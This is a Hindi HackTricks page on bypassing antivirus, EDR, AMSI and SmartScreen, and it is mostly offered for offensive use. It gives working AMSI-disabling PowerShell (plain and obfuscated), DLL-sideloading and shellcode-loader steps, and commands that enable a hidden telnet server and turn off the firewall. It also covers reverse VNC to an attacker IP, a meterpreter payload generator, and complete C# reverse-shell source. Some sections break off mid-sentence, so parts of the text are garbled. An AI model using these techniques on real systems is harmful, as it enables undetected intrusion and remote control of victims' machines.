# एंटीवायरस (AV) बाईपास

<details>

<summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>☁️ हैकट्रिक्स क्लाउड ☁️</strong></a> -<a href="https://twitter.com/hacktricks_live"><strong>🐦 ट्विटर 🐦</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>🎙️ ट्विच 🎙️</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>🎥 यूट्यूब 🎥</strong></a></summary>

* क्या आप किसी **साइबर सुरक्षा कंपनी** में काम करते हैं? क्या आप अपनी **कंपनी को हैकट्रिक्स में विज्ञापित करना चाहते हैं**? या क्या आपको **PEASS की नवीनतम संस्करण या HackTricks को PDF में डाउनलोड करने का उपयोग** करने की इच्छा है? [**सदस्यता योजनाएं**](https://github.com/sponsors/carlospolop) की जांच करें!
* [**द पीएस फैमिली**](https://opensea.io/collection/the-peass-family) की खोज करें, हमारा विशेष संग्रह [**NFTs**](https://opensea.io/collection/the-peass-family)
* [**आधिकारिक PEASS और HackTricks स्वैग**](https://peass.creator-spring.com) प्राप्त करें
* **शामिल हों** [**💬**](https://emojipedia.org/speech-balloon/) [**डिस्कॉर्ड समूह**](https://discord.gg/hRep4RUj7f) या [**टेलीग्राम समूह**](https://t.me/peass) में या मुझे **ट्विटर** पर **फॉलो** करें [**🐦**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks\_live)**.**
* **अपने हैकिंग ट्रिक्स साझा करें, हैकट्रिक्स रेपो** (https://github.com/carlospolop/hacktricks) **और** [**hacktricks-cloud रेपो**](https://github.com/carlospolop/hacktricks-cloud) **में पीआर जमा करके**।

</details>

**यह पृष्ठ लिखा गया है** [**@m2rc\_p**](https://twitter.com/m2rc\_p)**!**

## **AV टालने की मेथडोलॉजी**

वर्तमान में, AVs एक फ़ाइल को जांचने के लिए विभिन्न तकनीकों का उपयोग करते हैं, स्थायी पता लगाना, गतिशील विश्लेषण, और अधिक उन्नत EDRs के लिए आचरणात्मक विश्लेषण।

### **स्थायी पता लगाना**

स्थायी पता लगाने के लिए, एक बाइनरी या स्क्रिप्ट में ज्ञात खतरनाक स्ट्रिंग या बाइट के सरगर्मियों को झंझट करके और फ़ाइल से जानकारी निकालकर (जैसे फ़ाइल विवरण, कंपनी का नाम, डिजिटल हस्ताक्षर, आइकन, चेकसम, आदि) प्राप्त करके प्राप्त किया जाता है। इसका मतलब है कि ज्ञात सार्वजनिक उपकरणों का उपयोग करने से आपको आसानी से पकड़ लिया जा सकता है, क्योंकि उन्हें संशोधित और खतरनाक माना जा सकता है। इस प्रकार की पता लगाने से बचने के लिए कुछ तरीके हैं:

* **एन्क्रिप्शन**

यदि आप बाइनरी को एन्क्रिप्ट करते हैं, तो AV को आपके प्रोग्राम का पता लगाने का कोई तरीका नहीं होगा, लेकिन आपको कुछ तरह के लोडर की आवश्यकता होगी जो प्रोग्राम को डिक्रिप्ट करके और मेमोरी में चलाने के लिए होगा।

* **ओब्स्क्यूरेशन**

कभी-कभी आपको बाइनरी या स्क्रिप्ट में कुछ स्ट्रिंग्स को बदलने की जरूरत होती है ताकि यह AV को पार कर सके, लेकिन यह कार्य समय लेने वाला कार्य हो सकता है आपको ओब्स्क्यूरेट करने की कोशिश कर रहे हैं।

* **कस्टम टूलिंग**

यदि आप अपने खुद के उपकरण विकसित करते हैं, तो कोई ज्ञात खराब हस्ताक्षर नहीं होंगे, लेकिन इसमें बहुत समय और प्रयास लगेगा।

{% hint style="info" %}
Windows Defender स्थायी पता लगाने के लिए एक अच्छा तरीका है [ThreatCheck](https://github.com/rasta-mouse/ThreatCheck)। यह बुनियादी रूप से फ़ाइल को कई सेगमेंट में विभाजित करता है और फिर डिफ़ेंडर को प्रत
## EXEs बनाम DLLs

जब भी संभव हो, हमेशा **उपयोग करने के लिए DLLs को प्राथमिकता दें**, मेरे अनुभव के अनुसार, DLL फ़ाइलें आमतौर पर **कम डिटेक्ट की जाती हैं** और विश्लेषित की जाती हैं, इसलिए यह कुछ मामलों में पहचान से बचने के लिए एक बहुत ही सरल ट्रिक है (यदि आपके पेलोड को किसी तरह से DLL के रूप में चलाने का कोई तरीका है तो बेशक)।

हम इस छवि में देख सकते हैं कि Havoc के एक DLL पेलोड का antiscan.me में एक 4/26 डिटेक्शन दर है, जबकि EXE पेलोड का एक 7/26 डिटेक्शन दर है।

<figure><img src="../.gitbook/assets/image (6) (3) (1).png" alt=""><figcaption><p>antiscan.me में एक सामान्य Havoc EXE पेलोड बनाम एक सामान्य Havoc DLL का तुलनात्मक विश्लेषण</p></figcaption></figure>

अब हम कुछ ट्रिक्स दिखाएंगे जिन्हें आप DLL फ़ाइलों के साथ अधिक संकर्षी बनाने के लिए उपयोग कर सकते हैं।

## DLL साइडलोडिंग और प्रॉक्सीकरण

**DLL साइडलोडिंग** उद्यमी द्वारा उपयोग की जाने वाली DLL खोज क्रम का लाभ उठाता है और पीड़ित एप्लिकेशन और घातक पेलोड (या पेलोड्स) को एक साथ रखकर उपयोग करता है।

आप [Siofra](https://github.com/Cybereason/siofra) और निम्नलिखित पावरशेल स्क्रिप्ट का उपयोग करके DLL साइडलोडिंग के प्रति संकटग्रस्त कार्यक्रम की जांच कर सकते हैं:

{% code overflow="wrap" %}
```powershell
Get-ChildItem -Path "C:\Program Files\" -Filter *.exe -Recurse -File -Name| ForEach-Object {
$binarytoCheck = "C:\Program Files\" + $_
C:\Users\user\Desktop\Siofra64.exe --mode file-scan --enum-dependency --dll-hijack -f $binarytoCheck
}
```
{% endcode %}

यह कमांड "C:\Program Files\\" के अंदर DLL हाइजैकिंग के प्रोग्रामों की सूची और वे DLL फ़ाइलें जो वे लोड करने की कोशिश करते हैं, को आउटपुट करेगा।

मैं आपको सलाह देता हूँ कि आप **DLL हाइजैक करने योग्य/साइडलोड करने योग्य प्रोग्रामों की खोज करें**, यह तकनीक सही ढंग से किया जाए तो बहुत छिपकली होती है, लेकिन यदि आप सार्वजनिक रूप से ज्ञात DLL साइडलोड करने योग्य प्रोग्रामों का उपयोग करते हैं, तो आप आसानी से पकड़े जा सकते हैं।

केवल एक खतरनाक DLL को एक प्रोग्राम की लोड करने की उम्मीद के नाम से रखने से, आपका पेलोड लोड नहीं होगा, क्योंकि प्रोग्राम की उम्मीद होती है कि उस DLL में कुछ विशिष्ट फ़ंक्शन होंगे, इस समस्या को ठीक करने के लिए, हम एक और तकनीक का उपयोग करेंगे जिसे **DLL प्रॉक्सी/फ़ॉरवर्डिंग** कहा जाता है।

**DLL प्रॉक्सी** प्रोक्सी (और खतरनाक) DLL से प्रोग्राम द्वारा किए जाने वाले कॉल को मूल DLL को फ़ॉरवर्ड करता है, इस प्रकार प्रोग्राम की कार्यक्षमता को संरक्षित रखता है और आपके पेलोड के निष्पादन को संभाल सकता है।

मैं [@flangvik](https://twitter.com/Flangvik/) के [SharpDLLProxy](https://github.com/Flangvik/SharpDllProxy) प्रोजेक्ट का उपयोग कर रहा हूँ।

ये हैं मैंने फ़ॉलो किए गए कदम:

{% code overflow="wrap" %}
```
1. Find an application vulnerable to DLL Sideloading (siofra or using Process Hacker)
2. Generate some shellcode (I used Havoc C2)
3. (Optional) Encode your shellcode using Shikata Ga Nai (https://github.com/EgeBalci/sgn)
4. Use SharpDLLProxy to create the proxy dll (.\SharpDllProxy.exe --dll .\mimeTools.dll --payload .\demon.bin)
```
{% endcode %}

अंतिम कमांड हमें 2 फ़ाइलें देगा: एक DLL स्रोत कोड टेम्पलेट और मूल नाम बदलकर रखी DLL।

<figure><img src="../.gitbook/assets/sharpdllproxy.gif" alt=""><figcaption></figcaption></figure>

{% code overflow="wrap" %}
```
5. Create a new visual studio project (C++ DLL), paste the code generated by SharpDLLProxy (Under output_dllname/dllname_pragma.c) and compile. Now you should have a proxy dll which will load the shellcode you've specified and also forward any calls to the original DLL.
```
{% endcode %}

ये हैं परिणाम:

<figure><img src="../.gitbook/assets/dll_sideloading_demo.gif" alt=""><figcaption></figcaption></figure>

हमारे शेलकोड (SGN के साथ एनकोड किया गया) और प्रॉक्सी DLL दोनों को [antiscan.me](https://antiscan.me) में 0/26 डिटेक्शन दर है! मैं इसे सफलता कहूँगा।

<figure><img src="../.gitbook/assets/image (11) (3).png" alt=""><figcaption></figcaption></figure>

{% hint style="info" %}
मैं **ऊच्च अवधारणा** करता हूँ कि आप [S3cur3Th1sSh1t के twitch VOD](https://www.twitch.tv/videos/1644171543) को DLL Sideloading के बारे में देखें और इसके अलावा [ippsec के वीडियो](https://www.youtube.com/watch?v=3eROsG\_WNpE) को भी देखें ताकि हमारे बारे में और अधिक जानकारी प्राप्त करें।
{% endhint %}

## [**Freeze**](https://github.com/optiv/Freeze)

`Freeze एक पेलोड टूलकिट है जिसका उपयोग EDRs को अनदेखा करने के लिए सस्पेंडेड प्रोसेस, डायरेक्ट सिसकॉल्स और वैकल्पिक निष्पादन विधियों का उपयोग करके किया जा सकता है।`

आप Freeze का उपयोग करके अपने शेलकोड को एक छिपीले तरीके से लोड और निष्पादित कर सकते हैं।
```
Git clone the Freeze repo and build it (git clone https://github.com/optiv/Freeze.git && cd Freeze && go build Freeze.go)
1. Generate some shellcode, in this case I used Havoc C2.
2. ./Freeze -I demon.bin -encrypt -O demon.exe
3. Profit, no alerts from defender
```
<figure><img src="../.gitbook/assets/freeze_demo_hacktricks.gif" alt=""><figcaption></figcaption></figure>

{% hint style="info" %}
टालना बस एक बिल्ली और चूहे का खेल है, जो आज काम करता है वह कल पकड़ लिया जा सकता है, इसलिए कभी एक ही उपकरण पर निर्भर न करें, यदि संभव हो तो, कई टालने तकनीकों को जोड़ने का प्रयास करें।
{% endhint %}

## AMSI (एंटी-मैलवेयर स्कैन इंटरफेस)

AMSI को "[फाइललेस मैलवेयर](https://en.wikipedia.org/wiki/Fileless\_malware)" को रोकने के लिए बनाया गया था। पहले, AVs केवल **डिस्क पर फ़ाइलें** स्कैन करने के क्षमता रखते थे, इसलिए यदि आप किसी तरह से पेलोड **सीधे मेमोरी में** निष्पादित कर सकते थे, तो AV कुछ भी नहीं कर सकता था इसे रोकने के लिए, क्योंकि इसकी पर्याप्त दृश्यता नहीं थी।

AMSI सुविधा निम्नलिखित Windows के इन घटकों में सम्मिलित है।

* उपयोगकर्ता खाता नियंत्रण, या UAC (EXE, COM, MSI, या ActiveX स्थापना का उच्चारण)
* पावरशेल (स्क्रिप्ट, इंटरैक्टिव उपयोग, और गतिशील कोड मूल्यांकन)
* विंडोज स्क्रिप्ट होस्ट (wscript.exe और cscript.exe)
* जावास्क्रिप्ट और वीबीस्क्रिप्ट
* ऑफिस VBA मैक्रो

यह एंटीवायरस समाधानों को स्क्रिप्ट व्यवहार की जांच करने की अनुमति देता है जो स्क्रिप्ट सामग्री को अनगढ़ और अविलक्षित रूप में प्रकट करता है।

`IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Recon/PowerView.ps1')` चलाने पर Windows Defender पर निम्नलिखित चेतावनी प्रदर्शित होगी।

<figure><img src="../.gitbook/assets/image (4) (5).png" alt=""><figcaption></figcaption></figure>

ध्यान दें कि यह `amsi:` और फिर स्क्रिप्ट चलाने के लिए निर्धारित कार्यक्रम का पथ, इस मामले में powershell.exe, पहले जोड़ता है।

हमने किसी भी फ़ाइल को डिस्क पर नहीं छोड़ा, लेकिन अभी भी AMSI के कारण मेमोरी में पकड़ गए।

AMSI को टालने के कुछ तरीके हैं:

* **अप्रत्याशितता**

क्योंकि AMSI मुख्य रूप से स्थिर पकड़ों के साथ काम करता है, इसलिए आपके लोड करने की कोशिश की जाने वाली स्क्रिप्टों को संशोधित करना टालने के लिए एक अच्छा तरीका हो सकता है।

हालांकि, AMSI को यदि इसके पास कई स्तर हो तो भी स्क्रिप्टों को अनवरोधित करने की क्षमता होती है, इसलिए यह टालने के लिए एक बुरा विकल्प हो सकता है। यह इस पर निर्भर करता है कि कितनी चीजें ने टाला दिया गया है।

* **AMSI टालना**

AMSI को पावरशेल (और cscript.exe, wscript.exe, आदि) प्रक्रिया में एक DLL लोड करके लागू किया जाता है, इसलिए इसे आसानी से दुर्गम किया जा सकता है, यहां तक कि अनधिकृत उपयोगकर्ता के रूप में चलाने पर भी। AMSI के इस कमी के कारण, शोधकर्ताओं ने AMSI स्कैनिंग से टालने के कई तरीके खोजे हैं।

**त्रुटि को बलवान बनाना**

AMSI प्रारंभीकरण को विफल करने (amsiInitFailed) के लिए मजबूर करने से वर्तमान प्रक्रिया के लिए कोई स्कैन प्रारंभ नहीं होगा। इसे पहले [मैट ग्रेबर](https://twitter.com/mattifestation) ने खुलासा किया था और माइक्रोसॉफ्ट ने इसका व्यापक उपयोग रोकने के लिए एक हस्ताक्षर विकसित किया है।

{% code overflow="wrap" %}
```powershell
[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$true)
```
{% endcode %}

वर्तमान पावरशेल प्रक्रिया के लिए AMSI को अयोग्य बनाने के लिए एक पावरशेल कोड की एक पंक्ति ही काफी थी। यह पंक्ति बेशक AMSI द्वारा फ्लैग की गई है, इसलिए इस तकनीक का उपयोग करने के लिए कुछ संशोधन की आवश्यकता होती है।

यहां मैंने इस [Github Gist](https://gist.github.com/r00t-3xp10it/a0c6a368769eec3d3255d4814802b5db) से एक संशोधित AMSI बाईपास लिया है।
```powershell
Try{#Ams1 bypass technic nº 2
$Xdatabase = 'Utils';$Homedrive = 'si'
$ComponentDeviceId = "N`onP" + "ubl`ic" -join ''
$DiskMgr = 'Syst+@.MÂ£nÂ£g' + 'e@+nt.Auto@' + 'Â£tion.A' -join ''
$fdx = '@ms' + 'Â£InÂ£' + 'tF@Â£' + 'l+d' -Join '';Start-Sleep -Milliseconds 300
$CleanUp = $DiskMgr.Replace('@','m').Replace('Â£','a').Replace('+','e')
$Rawdata = $fdx.Replace('@','a').Replace('Â£','i').Replace('+','e')
$SDcleanup = [Ref].Assembly.GetType(('{0}m{1}{2}' -f $CleanUp,$Homedrive,$Xdatabase))
$Spotfix = $SDcleanup.GetField($Rawdata,"$ComponentDeviceId,Static")
$Spotfix.SetValue($null,$true)
}Catch{Throw $_}
```
**मेमोरी पैचिंग**

यह तकनीक पहले से ही [@RastaMouse](https://twitter.com/\_RastaMouse/) द्वारा खोजी गई थी और इसमें amsi.dll में "AmsiScanBuffer" फ़ंक्शन के लिए पता लगाने और इसे E\_INVALIDARG कोड के लिए वापस लौटने के निर्देशों के साथ अधिलेखित करने का शामिल होता है (जो उपयोगकर्ता द्वारा प्रदान किए गए इनपुट की स्कैनिंग के लिए जिम्मेदार है), इस तरह, वास्तविक स्कैन का परिणाम 0 के रूप में लौटेगा, जो स्वच्छ परिणाम के रूप में व्याख्या की जाती है।

{% hint style="info" %}
अधिक विस्तृत व्याख्या के लिए कृपया [https://rastamouse.me/memory-patching-amsi-bypass/](https://rastamouse.me/memory-patching-amsi-bypass/) पढ़ें।
{% endhint %}

AMSI को पावरशेल के साथ बाइपास करने के लिए भी कई अन्य तकनीकें हैं, [**इस पेज**](basic-powershell-for-pentesters/#amsi-bypass) और [इस रेपो](https://github.com/S3cur3Th1sSh1t/Amsi-Bypass-Powershell) की जांच करें और उनके बारे में और अधिक जानें।

## अस्पष्टीकरण

इसमें कई उपकरण हैं जो इस्तेमाल किए जा सकते हैं ताकि C# स्पष्ट-पाठ को **अस्पष्ट किया जा सके**, **मेटाप्रोग्रामिंग टेम्पलेट** को कंपाइल बाइनरी बनाने के लिए या **कंपाइल बाइनरी को अस्पष्ट करने** के लिए जैसे:

* [**InvisibilityCloak**](https://github.com/h4wkst3r/InvisibilityCloak)**: C# अस्पष्टीकरणकर्ता**
* [**Obfuscator-LLVM**](https://github.com/obfuscator-llvm/obfuscator): इस परियोजना का उद्देश्य [LLVM](http://www.llvm.org/) कंपाइलेशन सुइट का एक ओपन-सोर्स फोर्क प्रदान करना है जो [कोड अस्पष्टीकरण](http://en.wikipedia.org/wiki/Obfuscation\_\(software\)) और टैम्पर-प्रूफिंग के माध्यम से वृद्धि स्थानक सुरक्षा प्रदान कर सके।
* [**ADVobfuscator**](https://github.com/andrivet/ADVobfuscator): ADVobfuscator `C++11/14` भाषा का उपयोग करके कैसे करना है इसका उदाहरण देता है, कैसे कंपाइल समय पर बाहरी उपकरण का उपयोग किए बिना अस्पष्ट कोड उत्पन्न किया जाए।
* [**obfy**](https://github.com/fritzone/obfy): C++ टेम्पलेट मेटाप्रोग्रामिंग फ्रेमवर्क द्वारा उत्पन्न अस्पष्ट आपरेशन की एक परत जो अनुप्रयोग को क्रैक करने के इच्छुक व्यक्ति की जिंदगी को थोड़ा मुश्किल बना देगी।
* [**Alcatraz**](https://github.com/weak1337/Alcatraz)**:** Alcatraz एक x64 बाइनरी अस्पष्टीकरणकर्ता है जो विभिन्न पीई फ़ाइलों को अस्पष्ट कर सकता है, जिनमें शामिल हैं: .exe, .dll, .sys
* [**metame**](https://github.com/a0rtega/metame): Metame एक साधारित कार्यान्वयन के लिए एक सरल मेटामॉर्फिक कोड इंजन है।
* [**ropfuscator**](https://github.com/ropfuscator/ropfuscator): ROPfuscator ROP (return-oriented programming) का उपयोग करके LLVM समर्थित भाषाओं के लिए एक फाइन-ग्रेन्ड कोड अस्पष्टीकरण फ्रेमवर्क है। ROPfuscator एक कार्यक्रम को एक्सेंबली कोड स्तर पर अस्पष्ट करता है, नियमित निर्देशों को ROP श्रृंखलाओं में बदलकर, सामान्य नियंत्रण प्रवाह की हमारी प्राकृतिक धारणा को विफल करता है।
* [**Nimcrypt**](https://github.com/icyguider/nimcrypt): Nimcrypt एक .NET PE Crypter है जो Nim में लिखा गया है
* [**inceptor**](https://github.com/klezVirus/inceptor)**:** Inceptor मौजूदा EXE/DLL को शैलकोड में बदलने और उन्हें लोड करने में सक्षम है

## SmartScreen और MoTW

आपने शायद इंटरनेट से कुछ एक्ज़ीक्यूटेबल डाउनलोड किए और उन्हें चलाया होगा तो आपने इस स्क्रीन को देखा होगा।

माइक्रोसॉफ्ट डिफेंडर स्मार्टस्क्रीन एक सुरक्षा तंत्र है जो अंत उपयोगकर्ता को पोटेंशियली हानिकारक एप्लिकेशन चलाने से बचाने के लिए डिज़ाइन किया गया है।

<figure><img src="../.gitbook/assets/image (1) (4).png" alt=""><figcaption></figcaption></figure>

स्मार्टस्क्रीन मुख्य रूप से एक प्रतिष्ठा-आधारित दृष्टिकोण के साथ काम करता है, अर्थात असामान्य डाउनलोड एप्लिकेशन स्मार्टस्क्रीन को ट्रिगर करेंगे और अंत उपयोगकर्ता को फ़ाइल को चलाने से रोकेंगे (हालांकि फ़ाइल को फिर से चलाने के लिए More Info -> Run anyway पर क्लिक करके फ़ाइल को चलाया जा सकता है)।

**MoTW** (Mark of The Web) एक [NTFS विकल्प डेटा स्ट्रीम](https://en.wikipedia.org/wiki/NTFS#Alternate\_data\_stream\_\(ADS\)) है जिसका नाम Zone.Identifier है और जो इंटरनेट से फ़ाइलें डाउनलोड करते समय स्वचालित रूप से बनाया जाता ह
```powershell
PS C:\Tools\PackMyPayload> python .\PackMyPayload.py .\TotallyLegitApp.exe container.iso

+      o     +              o   +      o     +              o
+             o     +           +             o     +         +
o  +           +        +           o  +           +          o
-_-^-^-^-^-^-^-^-^-^-^-^-^-^-^-^-^-_-_-_-_-_-_-_,------,      o
:: PACK MY PAYLOAD (1.1.0)       -_-_-_-_-_-_-|   /\_/\
for all your container cravings   -_-_-_-_-_-~|__( ^ .^)  +    +
-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-__-_-_-_-_-_-_-''  ''
+      o         o   +       o       +      o         o   +       o
+      o            +      o    ~   Mariusz Banach / mgeeky    o
o      ~     +           ~          <mb [at] binary-offensive.com>
o           +                         o           +           +

[.] Packaging input file to output .iso (iso)...
Burning file onto ISO:
Adding file: /TotallyLegitApp.exe

[+] Generated file written to (size: 3420160): container.iso
```
यहां [PackMyPayload](https://github.com/mgeeky/PackMyPayload/) का उपयोग करके ISO फ़ाइलों में पेलोड को पैकेज करके SmartScreen को बाईपास करने के लिए एक डेमो है।

<figure><img src="../.gitbook/assets/packmypayload_demo.gif" alt=""><figcaption></figcaption></figure>

## C# असेंबली रिफ्लेक्शन

सी# बाइनरी को मेमोरी में लोड करना काफी समय से जाना जाता है और यह एंटीवायरस द्वारा पकड़े जाने के बिना अपने पोस्ट-एक्सप्लोइटेशन उपकरणों को चलाने का एक बहुत अच्छा तरीका है।

पेलोड को सीधे मेमोरी में लोड करने के कारण, हमें केवल पूरे प्रक्रिया के लिए AMSI को पैच करने की चिंता करनी होगी।

अधिकांश सी2 फ्रेमवर्क (sliver, Covenant, metasploit, CobaltStrike, Havoc, आदि) पहले से ही मेमोरी में सी# असेंबली को सीधे निष्पादित करने की क्षमता प्रदान करते हैं, लेकिन इसे करने के विभिन्न तरीके हैं:

* **Fork\&Run**

इसमें **एक नया बलिदानी प्रक्रिया उत्पन्न करना** शामिल होता है, नई प्रक्रिया में अपने पोस्ट-एक्सप्लोइटेशन दुष्प्रभावी कोड को इंजेक्ट करें, अपने दुष्प्रभावी कोड को निष्पादित करें और समाप्त होने पर नई प्रक्रिया को किल करें। इसके फायदे और नुकसान दोनों होते हैं। फोर्क और रन विधि का लाभ यह है कि निष्पादन हमारे बीकन इंप्लांट प्रक्रिया के **बाहर** होता है। इसका मतलब है कि अगर हमारे पोस्ट-एक्सप्लोइटेशन कार्रवाई में कुछ गलत हो जाता है या पकड़ा जाता है, तो हमारे इंप्लांट को **बचाने की बहुत अधिक संभावना** होती है। नुकसान यह है कि आपको **व्यवहारिक पकड़ों** द्वारा पकड़ा जाने का **अधिक अवसर** होता है।

<figure><img src="../.gitbook/assets/image (7) (1) (3).png" alt=""><figcaption></figcaption></figure>

* **Inline**

इसका मतलब है कि पोस्ट-एक्सप्लोइटेशन दुष्प्रभावी कोड को **अपनी खुद की प्रक्रिया में इंजेक्ट** करना। इस तरीके से, आपको एक नई प्रक्रिया बनाने और इसे एंटीवायरस द्वारा स्कैन करवाने से बचने की आवश्यकता नहीं होगी, लेकिन नुकसान यह है कि अगर आपके पेलोड के निष्पादन में कुछ गलत हो जाता है, तो आपके बीकन को खोने की **बहुत अधिक संभावना** होती है क्योंकि यह क्रैश हो सकता है।

<figure><img src="../.gitbook/assets/image (9) (3).png" alt=""><figcaption></figcaption></figure>

{% hint style="info" %}
यदि आप C# असेंबली लोडिंग के बारे में और अधिक पढ़ना चाहते हैं, तो कृपया इस लेख [https://securityintelligence.com/posts/net-execution-inlineexecute-assembly/](https://securityintelligence.com/posts/net-execution-inlineexecute-assembly/) और उनके InlineExecute-Assembly BOF ([https://github.com/xforcered/InlineExecute-Assembly](https://github.com/xforcered/InlineExecute-Assembly)) की जांच करें।
{% endhint %}

आप PowerShell से भी C# असेंबली लोड कर सकते हैं, [Invoke-SharpLoader](https://github.com/S3cur3Th1sSh1t/Invoke-SharpLoader) और [S3cur3th1sSh1t के वीडियो](https://www.youtube.com/watch?v=oe11Q-3Akuk) की जांच करें।

## अन्य प्रोग्रामिंग भाषाओं का उपयोग

[**https://github.com/deeexcee-io/LOI-Bins**](https://github.com/deeexcee-io/LOI-Bins) में प्रस्तावित रूप में, अन्य भाषाओं का उपयोग करके दुष्प्रभावी कोड को निष्पादित करना संभव है, जब आप कंप्रोमाइज़ हुए मशीन को हमलावर नियंत्रित SMB साझा के इंटरप्रेटर वातावरण तक पहुंच देते हैं।

इंटरप्रेटर बाइनरीज़ और SMB साझा पर्यावरण का उपयोग करके आप कंप्रोमाइज़ हुए मशीन की मेमोरी में इन भाषाओं में विचारहीन कोड **निष्पादित कर सकते हैं**।

रेपो इंडिकेट करता है: डिफेंडर अभी भी स्क्रिप्टों की स्कैनिंग करता है, लेकिन गो, जावा, PHP आदि का उपयोग करके हमें **स्थिर हस्ताक्षरों** को बाइपास करने के लिए **अधिक लचीलापन** होता है। इन भाषाओं में ये टेस्टिंग अनुप्रयोग उम्मीदवार साबित हुए हैं।

## उन्नत टालना

टालना एक बहुत कठिन विषय है, कभी-कभी आपको एक ही सिस्टम में कई विभिन्न टेलीमेट्री स्रोतों का ध्यान देना होता है, इसलिए पूरी तरह से अनुकरण नहीं कर पाना बहुत मुश्किल होता है।

आप अग्रिम टालन तकनीकों में अधिक जानने के लिए [@ATTL4S](https://twitter.com/DaniLJ94) के इस टॉक को देखने के लिए ऊर्जा दें।

{% embed url="https://vimeo.com/502507556?embedded=true&owner=32913914&source=vimeo_logo" %}

यहां एक और महान टॉक है [@mariuszbit](https://twitter.com/mariuszbit) के बारे में टालन में।

{% embed url="https://www.youtube.com/watch?v=IbA7Ung39o4" %}

## **पुरानी तकनीकें**

### **टेलनेट सर्वर**

Windows10 तक, सभी Windows के साथ एक **टेलनेट सर्वर** था जिसे आप स्थापित कर सकते थे (व्य
```
pkgmgr /iu:"TelnetServer" /quiet
```
इसे सिस्टम शुरू होने पर **शुरू** करें और अब इसे **चलाएं**:
```
sc config TlntSVR start= auto obj= localsystem
```
**टेलनेट पोर्ट बदलें** (छिपाने के लिए) और फ़ायरवॉल अक्षम करें:
```
tlntadmn config port=80
netsh advfirewall set allprofiles state off
```
### UltraVNC

इसे यहां से डाउनलोड करें: [http://www.uvnc.com/downloads/ultravnc.html](http://www.uvnc.com/downloads/ultravnc.html) (आपको सेटअप नहीं, बिन डाउनलोड करना है)

**होस्ट पर**: _**winvnc.exe**_ को चलाएं और सर्वर को कॉन्फ़िगर करें:

* _Disable TrayIcon_ विकल्प को सक्षम करें
* _VNC Password_ में पासवर्ड सेट करें
* _View-Only Password_ में पासवर्ड सेट करें

फिर, बाइनरी _**winvnc.exe**_ और **नई** बनाई गई फ़ाइल _**UltraVNC.ini**_ को **पीड़ित** के अंदर ले जाएं

#### **रिवर्स कनेक्शन**

**हमलावर** को अपने **होस्ट** के अंदर बाइनरी `vncviewer.exe -listen 5900` को **चलाना** चाहिए ताकि वह रिवर्स **VNC कनेक्शन** को पकड़ सके। फिर, **पीड़ित** के अंदर: winvnc डेमन `winvnc.exe -run` चलाएं और `winwnc.exe [-autoreconnect] -connect <हमलावर_आईपी>::5900` को चलाएं

**चेतावनी:** छिपाने के लिए आपको कुछ चीजें नहीं करनी चाहिए

* यदि `winvnc` पहले से चल रहा है तो इसे चालू न करें या आप [पॉपअप](https://i.imgur.com/1SROTTl.png) को ट्रिगर कर देंगे। `tasklist | findstr winvnc` के साथ चेक करें कि क्या यह चल रहा है
* `UltraVNC.ini` के बिना `winvnc` न चलाएं या यह [कॉन्फ़िग विंडो](https://i.imgur.com/rfMQWcf.png) को खोल देगा
* मदद के लिए `winvnc -h` न चलाएं या आप [पॉपअप](https://i.imgur.com/oc18wcu.png) को ट्रिगर कर देंगे

### GreatSCT

इसे यहां से डाउनलोड करें: [https://github.com/GreatSCT/GreatSCT](https://github.com/GreatSCT/GreatSCT)
```
git clone https://github.com/GreatSCT/GreatSCT.git
cd GreatSCT/setup/
./setup.sh
cd ..
./GreatSCT.py
```
ग्रेटएससीटी के अंदर:
```
use 1
list #Listing available payloads
use 9 #rev_tcp.py
set lhost 10.10.14.0
sel lport 4444
generate #payload is the default name
#This will generate a meterpreter xml and a rcc file for msfconsole
```
अब `msfconsole -r file.rc` के साथ **लिस्टर** शुरू करें और निम्नलिखित के साथ **xml पेलोड** को **चलाएं**:
```
C:\Windows\Microsoft.NET\Framework\v4.0.30319\msbuild.exe payload.xml
```
**वर्तमान रक्षक प्रक्रिया को बहुत तेजी से समाप्त कर देगा।**

### अपनी रिवर्स शेल को कंपाइल करना

https://medium.com/@Bank\_Security/undetectable-c-c-reverse-shells-fab4c0ec4f15

#### पहली सी# रिवर्सशेल

इसे निम्नलिखित के साथ कंपाइल करें:
```
c:\windows\Microsoft.NET\Framework\v4.0.30319\csc.exe /t:exe /out:back2.exe C:\Users\Public\Documents\Back1.cs.txt
```
इसका उपयोग करें:
```
back.exe <ATTACKER_IP> <PORT>
```

```csharp
using System;
using System.Text;
using System.IO;
using System.Diagnostics;
using System.ComponentModel;
using System.Linq;
using System.Net;
using System.Net.Sockets;


namespace ConnectBack
{
public class Program
{
static StreamWriter streamWriter;

public static void Main(string[] args)
{
using(TcpClient client = new TcpClient(args[0], System.Convert.ToInt32(args[1])))
{
using(Stream stream = client.GetStream())
{
using(StreamReader rdr = new StreamReader(stream))
{
streamWriter = new StreamWriter(stream);

StringBuilder strInput = new StringBuilder();

Process p = new Process();
p.StartInfo.FileName = "cmd.exe";
p.StartInfo.CreateNoWindow = true;
p.StartInfo.UseShellExecute = false;
p.StartInfo.RedirectStandardOutput = true;
p.StartInfo.RedirectStandardInput = true;
p.StartInfo.RedirectStandardError = true;
p.OutputDataReceived += new DataReceivedEventHandler(CmdOutputDataHandler);
p.Start();
p.BeginOutputReadLine();

while(true)
{
strInput.Append(rdr.ReadLine());
//strInput.Append("\n");
p.StandardInput.WriteLine(strInput);
strInput.Remove(0, strInput.Length);
}
}
}
}
}

private static void CmdOutputDataHandler(object sendingProcess, DataReceivedEventArgs outLine)
{
StringBuilder strOutput = new StringBuilder();

if (!String.IsNullOrEmpty(outLine.Data))
{
try
{
strOutput.Append(outLine.Data);
streamWriter.WriteLine(strOutput);
streamWriter.Flush();
}
catch (Exception err) { }
}
}

}
}
```
